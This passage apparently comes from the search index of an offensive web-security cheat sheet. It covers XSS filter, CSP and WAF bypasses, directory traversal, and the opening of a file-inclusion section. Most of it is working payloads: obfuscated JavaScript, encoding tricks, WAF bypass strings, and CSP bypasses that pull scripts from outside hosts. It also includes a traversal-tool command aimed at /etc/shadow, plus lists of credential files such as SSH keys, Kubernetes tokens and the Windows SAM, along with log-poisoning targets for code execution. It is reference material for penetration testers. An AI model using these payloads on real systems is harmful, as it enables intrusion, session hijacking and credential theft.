Cuneiform","text":"<pre><code>\ud808\udc00='',\ud808\ude7a=!\ud808\udc00+\ud808\udc00,\ud808\udc03=!\ud808\ude7a+\ud808\udc00,\ud808\uddfa=\ud808\udc00+{},\ud808\udf10=\ud808\ude7a[\ud808\udc00++],\n\ud808\udc1f=\ud808\ude7a[\ud808\ude2b=\ud808\udc00],\ud808\udc06=++\ud808\ude2b+\ud808\udc00,\ud808\udc79=\ud808\uddfa[\ud808\ude2b+\ud808\udc06],\ud808\ude7a[\ud808\udc79+=\ud808\uddfa[\ud808\udc00]\n+(\ud808\ude7a.\ud808\udc03+\ud808\uddfa)[\ud808\udc00]+\ud808\udc03[\ud808\udc06]+\ud808\udf10+\ud808\udc1f+\ud808\ude7a[\ud808\ude2b]+\ud808\udc79+\ud808\udf10+\ud808\uddfa[\ud808\udc00]\n+\ud808\udc1f][\ud808\udc79](\ud808\udc03[\ud808\udc00]+\ud808\udc03[\ud808\ude2b]+\ud808\ude7a[\ud808\udc06]+\ud808\udc1f+\ud808\udf10+\"(\ud808\udc00)\")()\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-using-lontara","title":"Bypass using Lontara","text":"<pre><code>\u1a06='',\u1a0a=!\u1a06+\u1a06,\u1a0e=!\u1a0a+\u1a06,\u1a02=\u1a06+{},\u1a07=\u1a0a[\u1a06++],\u1a0b=\u1a0a[\u1a0f=\u1a06],\u1a03=++\u1a0f+\u1a06,\u1a05=\u1a02[\u1a0f+\u1a03],\u1a0a[\u1a05+=\u1a02[\u1a06]+(\u1a0a.\u1a0e+\u1a02)[\u1a06]+\u1a0e[\u1a03]+\u1a07+\u1a0b+\u1a0a[\u1a0f]+\u1a05+\u1a07+\u1a02[\u1a06]+\u1a0b][\u1a05](\u1a0e[\u1a06]+\u1a0e[\u1a0f]+\u1a0a[\u1a03]+\u1a0b+\u1a07+\"(\u1a06)\")()\n</code></pre> <p>More alphabets on http://aem1k.com/aurebesh.js/#</p>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-using-ecmascript6","title":"Bypass using ECMAScript6","text":"<pre><code>&lt;script&gt;alert&amp;DiacriticalGrave;1&amp;DiacriticalGrave;&lt;/script&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-using-octal-encoding","title":"Bypass using Octal encoding","text":"<pre><code>javascript:'\\74\\163\\166\\147\\40\\157\\156\\154\\157\\141\\144\\75\\141\\154\\145\\162\\164\\50\\61\\51\\76'\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-using-unicode","title":"Bypass using Unicode","text":"<pre><code>Unicode character U+FF1C FULLWIDTH LESS\u00adTHAN SIGN (encoded as %EF%BC%9C) was\ntransformed into U+003C LESS\u00adTHAN SIGN (&lt;)\n\nUnicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was\ntransformed into U+0022 QUOTATION MARK (\")\n\nUnicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was\ntransformed into U+0027 APOSTROPHE (')\n\nE.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/\n%EF%BC%9E becomes &gt;\n%EF%BC%9C becomes &lt;\n</code></pre> <p>Bypass using Unicode converted to uppercase</p> <pre><code>\u0130 (%c4%b0).toLowerCase() =&gt; i\n\u0131 (%c4%b1).toUpperCase() =&gt; I\n\u017f (%c5%bf) .toUpperCase() =&gt; S\n\u212a (%E2%84%AA).toLowerCase() =&gt; k\n\n&lt;\u017fvg onload=... &gt; become &lt;SVG ONLOAD=...&gt;\n&lt;\u0131frame id=x onload=&gt;.toUpperCase() become &lt;IFRAME ID=X ONLOAD=&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-using-utf-7","title":"Bypass using UTF-7","text":"<pre><code>+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-using-utf-8","title":"Bypass using UTF-8","text":"<pre><code>&lt; = %C0%BC = %E0%80%BC = %F0%80%80%BC\n&gt; = %C0%BE = %E0%80%BE = %F0%80%80%BE\n' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7\n\" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2\n\" = %CA%BA\n' = %CA%B9\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-using-utf-16be","title":"Bypass using UTF-16be","text":"<pre><code>%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00\n\\x00&lt;\\x00s\\x00v\\x00g\\x00/\\x00o\\x00n\\x00l\\x00o\\x00a\\x00d\\x00=\\x00a\\x00l\\x00e\\x00r\\x00t\\x00(\\x00)\\x00&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-using-utf-32","title":"Bypass using UTF-32","text":"<pre><code>%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-using-bom","title":"Bypass using BOM","text":"<p>Byte Order Mark (The page must begin with the BOM character.) BOM character allows you to override charset of the page</p> <pre><code>BOM Character for UTF-16 Encoding:\nBig Endian : 0xFE 0xFF\nLittle Endian : 0xFF 0xFE\nXSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E\n\nBOM Character for UTF-32 Encoding:\nBig Endian : 0x00 0x00 0xFE 0xFF\nLittle Endian : 0xFF 0xFE 0x00 0x00\nXSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-using-weird-encoding-or-native-interpretation","title":"Bypass using weird encoding or native interpretation","text":"<pre><code>&lt;script&gt;\\u0061\\u006C\\u0065\\u0072\\u0074(1)&lt;/script&gt;\n&lt;img src=\"1\" onerror=\"&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;\" /&gt;\n&lt;iframe src=\"javascript:%61%6c%65%72%74%28%31%29\"&gt;&lt;/iframe&gt;\n&lt;script&gt;$=~[];$={___:++$,$$$$:(![]+\"\")[$],__$:++$,$_$_:(![]+\"\")[$],_$_:++$,$_$$:({}+\"\")[$],$$_$:($[$]+\"\")[$],_$$:++$,$$$_:(!\"\"+\"\")[$],$__:++$,$_$:++$,$$__:({}+\"\")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+\"\")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+\"\")[$.__$])+((!$)+\"\")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!\"\"+\"\")[$.__$])+($._=(!\"\"+\"\")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!\"\"+\"\")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+\"\\\"\"+$.$_$_+(![]+\"\")[$._$_]+$.$$$_+\"\\\\\"+$.__$+$.$$_+$._$_+$.__+\"(\"+$.___+\")\"+\"\\\"\")())();&lt;/script&gt;\n&lt;script&gtlt;/script&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-using-jsfuck","title":"Bypass using jsfuck","text":"<p>Bypass using jsfuck</p> <pre><coden</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#csp-bypass","title":"CSP Bypass","text":"<p>Check the CSP on https://csp-evaluator.withgoogle.com and the post : How to use Google\u2019s CSP Evaluator to bypass CSP</p>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-csp-using-jsonp-from-google-trick-by-apfeifer27","title":"Bypass CSP using JSONP from Google (Trick by @apfeifer27)","text":"<p>//google.com/complete/search?client=chrome&amp;jsonp=alert(1);</p> <pre><code>&lt;script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);&gt;\"\n</code></pre> <p>More JSONP endpoints: * /Intruders/jsonp_endpoint.txt * JSONBee/jsonp.txt</p>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-csp-by-labwallarmcom","title":"Bypass CSP by lab.wallarm.com","text":"<p>Works for CSP like <code>Content-Security-Policy: default-src 'self' 'unsafe-inline';</code>, POC here</p> <pre><code>script=document.createElement('script');\nscript.src='//bo0om.ru/csp.js';\nwindow.frames[0].document.head.appendChild(script);\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-csp-by-rhynorater","title":"Bypass CSP by Rhynorater","text":"<pre><code>// CSP Bypass with Inline and Eval\nd=document;f=d.createElement(\"iframe\");f.src=d.querySelector('link[href*=\".css\"]').href;d.body.append(f);s=d.createElement(\"script\");s.src=\"https://[YOUR_XSSHUNTER_USERNAME].xss.ht\";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-csp-by-akita_zen","title":"Bypass CSP by @akita_zen","text":"<p>Works for CSP like <code>script-src self</code></p> <pre><code>&lt;object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&gt;&lt;/object&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-csp-by-404death","title":"Bypass CSP by @404death","text":"<p>Works for CSP like <code>script-src 'self' data:</code> as warned about in the official mozilla documentation.</p> <pre><code>&lt;script src=\"data:,alert(1)\"&gt;/&lt;/script&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#common-waf-bypass","title":"Common WAF Bypass","text":""},{"location":"web-application-attacks/cross-site-scripting/#cloudflare-xss-bypasses-by-bohdan-korzhynskyi","title":"Cloudflare XSS Bypasses by @Bohdan Korzhynskyi","text":""},{"location":"web-application-attacks/cross-site-scripting/#25st-january-2021","title":"25st January 2021","text":"<pre><code>&lt;svg/onrandom=random onload=confirm(1)&gt;\n&lt;video onnull=null onmouseover=confirm(1)&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#21st-april-2020","title":"21st April 2020","text":"<pre><code>&lt;svg/OnLoad=\"`${prompt``}`\"&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#22nd-august-2019","title":"22nd August 2019","text":"<pre><code>&lt;svg/onload=%26nbsp;alert`bohdan`+\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#5th-june-2019","title":"5th June 2019","text":"<pre><code>1'\"&gt;&lt;img/src/onerror=.1|alert``&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#3rd-june-2019","title":"3rd June 2019","text":"<pre><code>&lt;svg onload=prompt%26%230000000040document.domain)&gt;\n&lt;svg onload=prompt%26%23x000000028;document.domain)&gt;\nxss'\"&gt;&lt;iframe srcdoc='%26lt;script&gt;;prompt`${document.domain}`%26lt;/script&gt;'&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#cloudflare-xss-bypass-22nd-march-2019-by-rakeshmane10","title":"Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10)","text":"<pre><code>&lt;svg/onload=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#00116&amp;#40&amp;#41&amp;#x2f&amp;#x2f\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#cloudflare-xss-bypass-27th-february-2018","title":"Cloudflare XSS Bypass - 27th February 2018","text":"<pre><code>&lt;a href=\"j&amp;Tab;a&amp;Tab;v&amp;Tab;asc&amp;NewLine;ri&amp;Tab;pt&amp;colon;&amp;lpar;a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;(document.domain)&amp;rpar;\"&gt;X&lt;/a&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#chrome-auditor-9th-august-2018","title":"Chrome Auditor - 9th August 2018","text":"<pre><code>&lt;/script&gt;&lt;svg&gt;&lt;script&gt;alert(1)-%26apos%3B\n</code></pre> <p>Live example by @brutelogic - https://brutelogic.com.br/xss.php</p>"},{"location":"web-application-attacks/cross-site-scripting/#incapsula-waf-bypass-by-alra3ees-8th-march-2018","title":"Incapsula WAF Bypass by @Alra3ees- 8th March 2018","text":"<pre><code>anythinglr00&lt;/script&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;uxldz\n\nanythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#incapsula-waf-bypass-by-c0d3g33k-11th-september-2018","title":"Incapsula WAF Bypass by @c0d3G33k - 11th September 2018","text":"<pre><code>&lt;object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='&gt;&lt;/object&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#incapsula-waf-bypass-by-daveysec-11th-may-2019","title":"Incapsula WAF Bypass by @daveysec - 11th May 2019","text":"<pre><code>&lt;svg onload\\r\\n=$.globalEval(\"al\"+\"ert()\");&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#akamai-waf-bypass-by-zseano-18th-june-2018","title":"Akamai WAF Bypass by @zseano - 18th June 2018","text":"<pre><code>?\"&gt;&lt;/script&gt;&lt;base%20c%3D=href%3Dhttps:\\mysite&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#akamai-waf-bypass-by-s0md3v-28th-october-2018","title":"Akamai WAF Bypass by @s0md3v - 28th October 2018","text":"<pre><code>&lt;dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#wordfence-waf-bypass-by-brutelogic-12th-september-2018","title":"WordFence WAF Bypass by @brutelogic - 12th September 2018","text":"<pre><code>&lt;a href=javas&amp;#99;ript:alert(1)&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#fortiweb-waf-bypass-by-rezaduty-9th-july-2019","title":"Fortiweb WAF Bypass by @rezaduty - 9th July 2019","text":"<pre><code>\\u003e\\u003c\\u0068\\u0031 onclick=alert('1')\\u003e\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#labs","title":"Labs","text":"<ul> <li>PortSwigger Labs for XSS</li> </ul>"},{"location":"web-application-attacks/cross-site-scripting/#references","title":"References","text":"<ul> <li>Unleashing-an-Ultimate-XSS-Polyglot</li> <li>tbm</li> <li>(Relative Path Overwrite) RPO XSS - Infinite Security</li> <li>RPO TheSpanner</li> <li>RPO Gadget - innerthmtl</li> <li>Relative Path Overwrite - Detectify</li> <li>XSS ghettoBypass - d3adend</li> <li>XSS without HTML: Client-Side Template Injection with AngularJS</li> <li>XSSING WEB PART - 2 - Rakesh Mane</li> <li>Making an XSS triggered by CSP bypass on Twitter. @tbmnull</li> <li>Ways to alert(document.domain) - @tomnomnom</li> <li>D1T1 - Michele Spagnuolo and Lukas Wilschelbaum - So We Broke All CSPs</li> <li>Sleeping stored Google XSS Awakens a $5000 Bounty by Patrik Fehrenbach</li> <li>RPO that lead to information leakage in Google by filedescriptor</li> <li>God-like XSS, Log-in, Log-out, Log-in in Uber by Jack Whitton</li> <li>Three Stored XSS in Facebook by Nirgoldshlager</li> <li>Using a Braun Shaver to Bypass XSS Audit and WAF by Frans Rosen</li> <li>An XSS on Facebook via PNGs &amp; Wonky Content Types by Jack Whitton</li> <li>Stored XSS in *.ebay.com by Jack Whitton</li> <li>Complicated, Best Report of Google XSS by Ramzes</li> <li>Tricky Html Injection and Possible XSS in sms-be-vip.twitter.com by secgeek</li> <li>Command Injection in Google Console by Venkat S</li> <li>Facebook's Moves - OAuth XSS by PAULOS YIBELO</li> <li>Stored XSS on developer.uber.com via admin account compromise in Uber by James Kettle (albinowax)</li> <li>Yahoo Mail stored XSS by Klikki Oy</li> <li>Abusing XSS Filter: One ^ leads to XSS(CVE-2016-3212) by Masato Kinugawa</li> <li>Youtube XSS by fransrosen</li> <li>Best Google XSS again - by Krzysztof Kotowicz</li> <li>IE &amp; Edge URL parsing Problem - by detectify</li> <li>Google XSS subdomain Clickjacking</li> <li>Microsoft XSS and Twitter XSS</li> <li>Flash XSS mega nz - by frans</li> <li>xss in google IE, Host Header Reflection</li> <li>Years ago Google xss</li> <li>xss in google by IE weird behavior</li> <li>xss in Yahoo Fantasy Sport</li> <li>xss in Yahoo Mail Again, worth $10000 by Klikki Oy</li> <li>Sleeping XSS in Google by securityguard</li> <li>Decoding a .htpasswd to earn a payload of money by securityguard</li> <li>Google Account Takeover</li> <li>AirBnb Bug Bounty: Turning Self-XSS into Good-XSS #2 by geekboy</li> <li>Uber Self XSS to Global XSS</li> <li>How I found a $5,000 Google Maps XSS (by fiddling with Protobuf) by Marin MoulinierFollow</li> <li>Airbnb \u2013 When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities by Brett</li> <li>XSSI, Client Side Brute Force</li> <li>postMessage XSS on a million sites - December 15, 2016 - Mathias Karlsson</li> <li>postMessage XSS Bypass</li> <li>XSS in Uber via Cookie by zhchbin</li> <li>Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP by frans</li> <li>XSS due to improper regex in third party js Uber 7k XSS</li> <li>XSS in TinyMCE 2.4.0 by Jelmer de Hen</li> <li>Pass uncoded URL in IE11 to cause XSS</li> <li>Twitter XSS by stopping redirection and javascript scheme by Sergey Bobrov</li> <li>Auth DOM Uber XSS</li> <li>XSS in www.yahoo.com</li> <li>Stored XSS, and SSRF in Google using the Dataset Publishing Language</li> <li>Stored XSS on Snapchat</li> <li>XSS cheat sheet - PortSwigger</li> <li>mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, J\u00f6rg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang</li> <li>Self Closing Script</li> <li>Bypass &lt; with \uff1c</li> <li>Bypassing Signature-Based XSS Filters: Modifying Script Code</li> </ul>"},{"location":"web-application-attacks/directory-travseral/","title":"Directory Traversal","text":"<p>Path Traversal, also known as Directory Traversal, is a type of security vulnerability that occurs when an attacker manipulates variables that reference files with \u201cdot-dot-slash (../)\u201d sequences or similar constructs. This can allow the attacker to access arbitrary files and directories stored on the file system.</p>"},{"location":"web-application-attacks/directory-travseral/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Basic exploitation<ul> <li>16 bits Unicode encoding</li> <li>UTF-8 Unicode encoding</li> <li>Bypass \"../\" replaced by \"\"</li> <li>Bypass \"../\" with \";\"</li> <li>Double URL encoding</li> <li>UNC Bypass</li> <li>NGINX/ALB Bypass</li> <li>ASPNET Cookieless Bypass</li> </ul> </li> <li>Path Traversal<ul> <li>Interesting Linux files</li> <li>Interesting Windows files</li> </ul> </li> <li>References</li> </ul>"},{"location":"web-application-attacks/directory-travseral/#tools","title":"Tools","text":"<ul> <li>dotdotpwn - https://github.com/wireghoul/dotdotpwn <pre><code>git clone https://github.com/wireghoul/dotdotpwn\nperl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b\n</code></pre></li> </ul>"},{"location":"web-application-attacks/directory-travseral/#basic-exploitation","title":"Basic exploitation","text":"<p>We can use the <code>..</code> characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.</p> <pre><code>../\n..\\\n..\\/\n%2e%2e%2f\n%252e%252e%252f\n%c0%ae%c0%ae%c0%af\n%uff0e%uff0e%u2215\n%uff0e%uff0e%u2216\n</code></pre>"},{"location":"web-application-attacks/directory-travseral/#16-bits-unicode-encoding","title":"16 bits Unicode encoding","text":"<pre><code>. = %u002e\n/ = %u2215\n\\ = %u2216\n</code></pre>"},{"location":"web-application-attacks/directory-travseral/#utf-8-unicode-encoding","title":"UTF-8 Unicode encoding","text":"<pre><code>. = %c0%2e, %e0%40%ae, %c0ae\n/ = %c0%af, %e0%80%af, %c0%2f\n\\ = %c0%5c, %c0%80%5c\n</code></pre>"},{"location":"web-application-attacks/directory-travseral/#bypass-replaced-by","title":"Bypass \"../\" replaced by \"\"","text":"<p>Sometimes you encounter a WAF which remove the <code>../</code> characters from the strings, just duplicate them.</p> <pre><code>..././\n...\\.\\\n</code></pre>"},{"location":"web-application-attacks/directory-travseral/#bypass-with","title":"Bypass \"../\" with \";\"","text":"<pre><code>..;/\nhttp://domain.tld/page.jsp?include=..;/..;/sensitive.txt \n</code></pre>"},{"location":"web-application-attacks/directory-travseral/#double-url-encoding","title":"Double URL encoding","text":"<pre><code>. = %252e\n/ = %252f\n\\ = %255c\n</code></pre> <p>e.g: Spring MVC Directory Traversal Vulnerability (CVE-2018-1271) with <code>http://localhost:8080/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini</code></p>"},{"location":"web-application-attacks/directory-travseral/#unc-bypass","title":"UNC Bypass","text":"<p>An attacker can inject a Windows UNC share ('\\UNC\\share\\name') into a software system to potentially redirect access to an unintended location or arbitrary file.</p> <pre><code>\\\\localhost\\c$\\windows\\win.ini\n</code></pre>"},{"location":"web-application-attacks/directory-travseral/#nginxalb-bypass","title":"NGINX/ALB Bypass","text":"<p>NGINX in certain configurations and ALB can block traversal attacks in the route, For example: <code>http://nginx-server/../../</code> will return a 400 bad request.</p> <p>To bypass this behaviour just add forward slashes in front of the url: <code>http://nginx-server////////../../</code></p>"},{"location":"web-application-attacks/directory-travseral/#aspnet-cookieless-bypass","title":"ASPNET Cookieless Bypass","text":"<p>When cookieless session state is enabled. Instead of relying on a cookie to identify the session, ASP.NET modifies the URL by embedding the Session ID directly into it.</p> <p>For example, a typical URL might be transformed from: <code>http://example.com/page.aspx</code> to something like: <code>http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx</code>. The value within <code>(S(...))</code> is the Session ID. </p> <p>We can use this behavior to bypass filtered URLs.</p> <pre><code>/admin/(S(X))/main.aspx\n/admin/Foobar/(S(X))/../(S(X))/main.aspx\n/(S(X))/admin/(S(X))/main.aspx\n</code></pre>"},{"location":"web-application-attacks/directory-travseral/#java-bypass","title":"Java Bypass","text":"<p>Bypass Java's URL protocol</p> <pre><code>url:file:///etc/passwd\nurl:http://127.0.0.1:8080\n</code></pre>"},{"location":"web-application-attacks/directory-travseral/#path-traversal","title":"Path Traversal","text":""},{"location":"web-application-attacks/directory-travseral/#interesting-linux-files","title":"Interesting Linux files","text":"<pre><code>/etc/issue\n/etc/passwd\n/etc/shadow\n/etc/group\n/etc/hosts\n/etc/motd\n/etc/mysql/my.cnf\n/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)\n/proc/self/environ\n/proc/version\n/proc/cmdline\n/proc/sched_debug\n/proc/mounts\n/proc/net/arp\n/proc/net/route\n/proc/net/tcp\n/proc/net/udp\n/proc/self/cwd/index.php\n/proc/self/cwd/main.py\n/home/$USER/.bash_history\n/home/$USER/.ssh/id_rsa\n/run/secrets/kubernetes.io/serviceaccount/token\n/run/secrets/kubernetes.io/serviceaccount/namespace\n/run/secrets/kubernetes.io/serviceaccount/certificate\n/var/run/secrets/kubernetes.io/serviceaccount\n/var/lib/mlocate/mlocate.db\n/var/lib/plocate/plocate.db\n/var/lib/mlocate.db\n</code></pre>"},{"location":"web-application-attacks/directory-travseral/#interesting-windows-files","title":"Interesting Windows files","text":"<p>Always existing file in recent Windows machine.  Ideal to test path traversal but nothing much interesting inside...</p> <pre><code>c:\\windows\\system32\\license.rtf\nc:\\windows\\system32\\eula.txt\n</code></pre> <p>Interesting files to check out (Extracted from https://github.com/soffensive/windowsblindread)</p> <pre><code>c:/boot.ini\nc:/inetpub/logs/logfiles\nc:/inetpub/wwwroot/global.asa\nc:/inetpub/wwwroot/index.asp\nc:/inetpub/wwwroot/web.config\nc:/sysprep.inf\nc:/sysprep.xml\nc:/sysprep/sysprep.inf\nc:/sysprep/sysprep.xml\nc:/system32/inetsrv/metabase.xml\nc:/sysprep.inf\nc:/sysprep.xml\nc:/sysprep/sysprep.inf\nc:/sysprep/sysprep.xml\nc:/system volume information/wpsettings.dat\nc:/system32/inetsrv/metabase.xml\nc:/unattend.txt\nc:/unattend.xml\nc:/unattended.txt\nc:/unattended.xml\nc:/windows/repair/sam\nc:/windows/repair/system\n</code></pre> <p>The following log files are controllable and can be included with an evil payload to achieve a command execution</p> <pre><code>/var/log/apache/access.log\n/var/log/apache/error.log\n/var/log/httpd/error_log\n/usr/local/apache/log/error_log\n/usr/local/apache2/log/error_log\n/var/log/nginx/access.log\n/var/log/nginx/error.log\n/var/log/vsftpd.log\n/var/log/sshd.log\n/var/log/mail\n</code></pre>"},{"location":"web-application-attacks/directory-travseral/#labs","title":"Labs","text":"<ul> <li>File path traversal, simple case</li> <li>File path traversal, traversal sequences blocked with absolute path bypass</li> <li>File path traversal, traversal sequences stripped non-recursively</li> <li>File path traversal, traversal sequences stripped with superfluous URL-decode</li> <li>File path traversal, validation of start of path</li> <li>File path traversal, validation of file extension with null byte bypass</li> </ul>"},{"location":"web-application-attacks/directory-travseral/#references","title":"References","text":"<ul> <li>Path Traversal Cheat Sheet: Windows</li> <li>Directory traversal attack - Wikipedia</li> <li>CWE-40: Path Traversal: '\\UNC\\share\\name\\' (Windows UNC Share) - CWE Mitre - December 27, 2018</li> <li>NGINX may be protecting your applications from traversal attacks without you even knowing</li> <li>Directory traversal - Portswigger</li> <li>Cookieless ASPNET - Soroush Dalili</li> <li>EP 057 | Proc filesystem tricks &amp; locatedb abuse with @remsio &amp; @_bluesheet - TheLaluka - 30 nov. 2023</li> </ul>"},{"location":"web-application-attacks/file-inclusion/","title":"File Inclusion","text":"<p>A File Inclusion Vulnerability refers to a type of security vulnerability in web applications, particularly prevalent in applications developed in PHP, where an attacker can include a file, usually exploiting a lack of proper input/output sanitization. This vulnerability can lead to a range of malicious activities, including code execution, data theft, and website defacement.</p> <p>File Inclusion Vulnerability should be differenciated from Path Traversal. The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a \"reading\" mechanism implemented in the target application, when the File Inclusion will lead to the execution of arbitrary code.</p>"},{"location":"web-application-attacks/file-inclusion/#summary","title":"Summary","text":"<ul> <li>File Inclusion</li> <li>Summary</li> <li>Tools</li> <li>Local File Inclusion<ul> <li>Null byte</li> <li>Double encoding</li> <li>UTF-8 encoding</li> <li>Path and dot truncation</li> <li>Filter bypass tricks</li> </ul> </li> <li>Remote File Inclusion<ul> <li>Null byte</li> <li>Double encoding</li> <li>Bypass allow_url_include</li> </ul> </li> <li>LFI / RFI using wrappers<ul> <li>Wrapper php://filter</li> <li>Wrapper data://</li> <li>Wrapper expect://</li> <li>Wrapper input://</li> <li>Wrapper zip://</li> <li>Wrapper phar://</li> <li>Wrapper convert.iconv:// and dechunk://</li> </ul> </li> <li>LFI to RCE via /proc/*/fd</li> <li>LFI to RCE via /proc/self/environ</li> <li>LFI to RCE via upload</li> <li>LFI to RCE via upload (race)</li> <li>LFI to RCE via upload (FindFirstFile)</li> <li>LFI to RCE via phpinfo()</li> <li>LFI to RCE via controlled log file<ul> <li>RCE via SSH</li> <li>RCE via Mail</li> <li>RCE via Apache logs</li> </ul> </li> <li>LFI to RCE via PHP sessions</li> <li>LFI to RCE via PHP PEARCMD</li> <li>LFI to RCE via credentials files</li> <li>References</li> </ul>"},{"location":"web-application-attacks/file-inclusion/#tools","title":"Tools","text":"<ul> <li>Kadimus - https://github.com/P0cL4bs/Kadimus</li> <li>LFISuite - https://github.com/D35m0nd142/LFISuite</li> <li>fimap - https://github.com/kurobeats/fimap</li> <li>panoptic - https://github.com/lightos/Panoptic</li> </ul>"},{"location":"web-application-attacks/file-inclusion/#local-file-inclusion","title":"Local File Inclusion","text":"<p>Consider a PHP script that includes a file based on user input. If proper sanitization is not in place, an attacker could manipulate the <code>page</code> parameter to include local or remote files, leading to unauthorized access or code execution.</p> <pre><code>&lt;?php\n$file = $_GET['page'];\ninclude($file);\n?&gt;\n</code></pre> <p>In the following examples we include the <code>/etc/passwd</code> file, check the <code>Directory &amp; Path Traversal</code> chapter for more interesting files.</p> <pre><code>http://example.com/index.php?page=../../../etc/passwd\n</code></pre>"},{"location":"web-application-attacks/file-inclusion/#null-byte","title":"Null byte","text":"<p> In versions of PHP below 5.3.4 we can terminate with null byte.</p> <pre><code>http://example.com/index.php?page=../../../etc/passwd%00\n</code></pre>"},{"location":"web-application-attacks/file-inclusion/#double-encoding","title":"Double encoding","text":"<pre><code>http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd\nhttp://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00\n</code></pre>"},{"location":"web-application-attacks/file-inclusion/#utf-8-encoding","title":"UTF-8 encoding","text":"<pre><code>http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd\nhttp://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00\n</code></pre>"},{"location":"web-application-attacks/file-inclusion/#path-and-dot-truncation","title":"Path and dot truncation","text":"<p>On most PHP installations a filename longer than <code>4096</code> bytes will be 